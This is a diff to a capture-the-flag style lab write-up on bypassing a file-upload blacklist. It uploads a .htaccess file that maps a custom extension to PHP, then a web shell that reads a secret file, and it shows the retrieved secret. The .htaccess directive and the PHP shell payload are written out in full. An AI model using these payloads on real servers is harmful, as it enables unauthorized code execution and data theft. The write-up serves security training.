@@ -11,8 +11,9 @@ It fails to block `.htaccess` and `.l33t` files, allowing an attacker to overrid
 
 1.  Logged in to the account functionality.
 2.  Created and uploaded a `.htaccess` file with the following content to map `.l33t` extension to PHP:
+3.  
 AddType application/x-httpd-php .l33t
-3.  Created a web shell file `exploit.l33t` with payload:
+  Created a web shell file `exploit.l33t` with payload:
     ```php
     <?php echo file_get_contents('/home/carlos/secret'); ?>
 4.Uploaded exploit.l33t via the avatar upload feature.
@@ -20,9 +21,11 @@ AddType application/x-httpd-php .l33t
 6.Submitted the secret to solve the lab.
 
 Proof of Concept
-
-Lab09-Scretecode.png
-Lab09-solved.png
+Secret Retrieved:
+![Secret](Lab09-Scretecode.png)
+Lab Solved:
+![Solved](Lab09-solved.png)
+Secret:
 Secret: fANjtZmr6DIJFTBQauwpNkIRr8cOmuCG
 
 ##Mitigation
